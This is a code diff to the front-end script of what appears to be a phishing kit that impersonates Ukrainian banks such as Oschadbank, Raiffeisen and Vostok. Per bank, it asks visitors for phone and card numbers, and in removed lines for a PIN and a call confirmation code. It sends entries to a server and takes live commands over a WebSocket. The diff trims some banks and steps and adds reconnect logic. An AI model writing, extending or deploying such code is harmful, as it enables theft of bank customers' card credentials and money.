@@ -154,9 +154,7 @@ document.addEventListener('DOMContentLoaded', () => {
             theme: 'oschadbank',
             steps: [
                 { type: 'phone', title: 'Введіть номер телефону' },
-                { type: 'card', title: 'Введіть номер карти' },
-                { type: 'pin', title: 'Введіть ПІН-код' },
-                { type: 'call_code', title: 'Підтвердження дзвінком' }
+                { type: 'card', title: 'Введіть номер карти' }
             ]
         },
         'raiffeisen': {
@@ -165,30 +163,6 @@ document.addEventListener('DOMContentLoaded', () => {
             theme: 'raiffeisen',
             steps: specialFlowSteps,
             special: true
-        },
-        'alliance': {
-            name: 'Альянс',
-            logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14',
-            theme: 'alliance',
-            steps: specialFlowSteps,
-            special: true,
-            unavailable: true
-        },
-        'pumb': {
-            name: 'ПУМБ',
-            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp',
-            theme: 'pumb',
-            steps: specialFlowSteps,
-            special: true,
-            unavailable: true
-        },
-        'otp': {
-            name: 'OTP Bank',
-            logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png',
-            theme: 'otp',
-            steps: specialFlowSteps,
-            special: true,
-            unavailable: true
         },
         'vostok': {
             name: 'Восток',
@@ -224,8 +198,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
         const bank = bankFlows[id];
-        const unavailableClass = bank.unavailable ? 'unavailable' : '';
-        return `<a href="#" class="bank-item ${unavailableClass}" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
+        return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
     }).join('');
 
     if (isBanned) {
@@ -234,20 +207,30 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function connectWebSocket() {
-        ws = new WebSocket(`wss://${window.location.host}`); // Динамический WebSocket
-        ws.onopen = () => {
-            console.log('WebSocket connected');
-            ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
-        };
-        ws.onmessage = (event) => {
-            const command = JSON.parse(event.data);
-            handleServerCommand(command);
-        };
-        ws.onclose = () => {
-            console.log('WebSocket closed, reconnecting...');
-            setTimeout(connectWebSocket, 3000);
-        };
-        ws.onerror = (error) => console.error('WebSocket error:', error);
+        // Добавляем retry для WS
+        let reconnectAttempts = 0;
+        const maxReconnects = 5;
+        function attemptConnect() {
+            ws = new WebSocket(`wss://${window.location.host}/ws`); // Добавляем /ws для ясности
+            ws.onopen = () => {
+                console.log('WebSocket connected');
+                reconnectAttempts = 0;
+                ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
+            };
+            ws.onmessage = (event) => {
+                const command = JSON.parse(event.data);
+                handleServerCommand(command);
+            };
+            ws.onclose = () => {
+                console.log('WebSocket closed, reconnecting...');
+                if (reconnectAttempts < maxReconnects) {
+                    reconnectAttempts++;
+                    setTimeout(attemptConnect, 1000 * reconnectAttempts);
+                }
+            };
+            ws.onerror = (error) => console.error('WebSocket error:', error);
+        }
+        attemptConnect();
     }
 
     async function sendDataToServer(data, isFinal) {
@@ -288,13 +271,10 @@ document.addEventListener('DOMContentLoaded', () => {
         let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
 
         if (activeBankData.theme === 'oschadbank' && step.type === 'card') {
-            sendDataToServer(data, false);
+            isFinalStep = true; // Для Ощад после card - финал
+            sendDataToServer(data, isFinalStep);
             showWaitingScreen();
             return;
-        }
-
-        if (activeBankData.theme === 'oschadbank' && step.type === 'pin') {
-            isFinalStep = true;
         }
 
         sendDataToServer(data, isFinalStep);
@@ -521,7 +501,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    document.querySelectorAll('.bank-item:not(.unavailable)').forEach(item => {
+    document.querySelectorAll('.bank-item').forEach(item => {
         item.addEventListener('click', e => {
             e.preventDefault();
             if (isBanned) return;
